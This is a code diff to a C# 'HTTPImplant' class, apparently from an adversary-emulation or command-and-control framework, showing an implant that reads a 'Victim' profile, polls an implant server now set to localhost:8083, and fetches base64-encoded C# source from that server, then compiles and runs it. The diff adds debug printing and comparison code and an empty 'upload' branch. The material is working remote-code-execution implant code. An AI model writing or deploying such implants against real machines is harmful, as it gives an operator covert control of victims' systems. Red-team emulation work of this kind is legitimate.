@@ -42,8 +42,8 @@ namespace HTTPImplant
     public class Implant
     {
         public static Victim victim = new Victim();
-        public static string host = "<IP>";  // Host of the implant server
-        public static string port = "<PORT>"; // Port of the implant server
+        public static string host = "localhost";  // Host of the implant server
+        public static string port = "8083"; // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
         public static bool SMB = false;
         private static bool usesmb;
@@ -107,7 +107,7 @@ namespace HTTPImplant
                         command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                         command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                         command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
-                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"nullterm" }, StringSplitOptions.None)[1];
+                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"usesmb" }, StringSplitOptions.None)[1];
                         command.usesmb = jsonResponse.Split(new string[] { "\"usesmb\":\"", "\"}" }, StringSplitOptions.None)[1];
 
                         if (!bool.TryParse(command.usesmb, out usesmb))
@@ -174,17 +174,42 @@ namespace HTTPImplant
                                     Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
                                     try
                                     {
+                                        string sourceCode = "using System;\n\nclass Program {\n    public static void Main()\n    {\n        Console.WriteLine(\"Hello Adversary Emulator Program\");\n    }\n}";
+
                                         string encodedSourceCode = command.File;
-                                        string Args = command.Args;
+
+                                        Console.WriteLine("Encoded Source Code: \n" + encodedSourceCode);
+
                                         byte[] code = Convert.FromBase64String(encodedSourceCode);
                                         string decodedSourceCode = Encoding.UTF8.GetString(code);
 
-                                        CompileAndRunNET.ExecuteCS(decodedSourceCode, Args, true);
+                                        Console.WriteLine("Decoded Source Code: \n" + decodedSourceCode);
+
+                                        // Compare the strings character by character
+                                        for (int i = 0; i < Math.Min(sourceCode.Length, decodedSourceCode.Length); i++)
+                                        {
+                                            if (sourceCode[i] != decodedSourceCode[i])
+                                            {
+                                                Console.WriteLine($"Difference at position {i}: '{sourceCode[i]}' != '{decodedSourceCode[i]}'");
+                                                break;
+                                            }
+                                        }
+
+                                        if (sourceCode.Length != decodedSourceCode.Length)
+                                        {
+                                            Console.WriteLine($"Length mismatch: sourceCode Length = {sourceCode.Length}, decodedSourceCode Length = {decodedSourceCode.Length}");
+                                        }
+
+                                        CompileAndRunNET.ExecuteCS(decodedSourceCode);
                                     }
                                     catch (Exception ex)
                                     {
                                         Console.WriteLine("Exception caught: " + ex.ToString());
                                     }
+                                }
+                                else if (command.Input.Trim().Equals("upload", StringComparison.OrdinalIgnoreCase))
+                                {
+
                                 }
                             } while (command.Input != lastCommandExecuted);
                         }
